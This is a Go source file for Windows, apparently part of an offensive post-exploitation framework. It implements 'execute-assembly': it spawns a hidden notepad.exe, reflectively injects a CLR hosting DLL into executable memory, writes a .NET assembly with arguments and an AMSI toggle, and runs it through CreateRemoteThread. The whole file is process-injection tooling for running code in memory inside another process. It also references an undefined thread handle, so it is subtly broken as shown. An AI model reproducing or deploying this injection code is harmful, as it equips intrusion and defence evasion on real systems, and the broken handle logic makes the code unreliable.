// +build windows

package assembly

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	BobLoaderOffset     = 0x00000e00 //  0x00000af0
	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT          = 0x001000
	MEM_RESERVE         = 0x002000
	MAX_ASSEMBLY_LENGTH = 1025024
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
)

func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
	r1, _, e1 := procVirtualAllocEx.Call(
		uintptr(process),
		addr,
		uintptr(size),
		uintptr(allocType),
		uintptr(protect))

	if int(r1) == 0 {
		return r1, os.NewSyscallError("VirtualAllocEx", e1)
	}
	return r1, nil
}

func writeProcessMemory(process syscall.Handle, addr uintptr, buf unsafe.Pointer, size uint32) (uint32, error) {
	var nLength uint32
	r1, _, e1 := procWriteProcessMemory.Call(
		uintptr(process),
		addr,
		uintptr(buf),
		uintptr(size),
		uintptr(unsafe.Pointer(&nLength)))

	if int(r1) == 0 {
		return nLength, os.NewSyscallError("WriteProcessMemory", e1)
	}
	return nLength, nil
}

func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, stackSize uint32, startAddress, parameter uintptr, creationFlags uint32) (syscall.Handle, uint32, error) {
	var threadID uint32
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadID)))
	runtime.KeepAlive(sa)
	if int(r1) == 0 {
		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
	}
	return syscall.Handle(r1), threadID, nil
}

func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
	var exitCode uint32
	r1, _, e1 := procGetExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return exitCode, e1
	}
	return exitCode, nil
}

// ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
// along with a provided .NET assembly to execute.
func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) error {
	AssemblySizeArr := convertIntToByteArr(len(assembly))
	ParamsSizeArr := convertIntToByteArr(len(params))

	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	cmd.Start()
	pid := cmd.Process.Pid

	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return err
	}
	// WriteProcessMemory to write the reflective loader into the process
	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
	if err != nil {
		return err
	}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return err
	}

	// 4 bytes Assembly Size
	// 4 bytes Params Size
	// 1 byte AMSI bool  0x00 no  0x01 yes
	// parameter bytes
	// assembly bytes
	payload := append(AssemblySizeArr, ParamsSizeArr...)
	if amsi {
		payload = append(payload, byte(1))
	} else {
		payload = append(payload, byte(0))
	}
	payload = append(payload, []byte(params)...)
	payload = append(payload, assembly...)

	// WriteProcessMemory to write the .NET assembly + args
	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&payload[0]), uint32(len(payload)))
	if err != nil {
		return err
	}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	attr := new(syscall.SecurityAttributes)
	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
	if err != nil {
		return err
	}
	log.Println("Got thread handle:", threadHandle)
	for {
		code, err := getExitCodeThread(threadHandle)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Fatalln(err.Error())
		}
		if code == 259 {
			time.Sleep(1000 * time.Millisecond)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
	return nil
}

func convertIntToByteArr(num int) (arr []byte) {
	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
	arr = append(arr, byte(num%256))
	v := num / 256
	arr = append(arr, byte(v%256))
	v = v / 256
	arr = append(arr, byte(v%256))
	v = v / 256
	arr = append(arr, byte(v))

	return
}
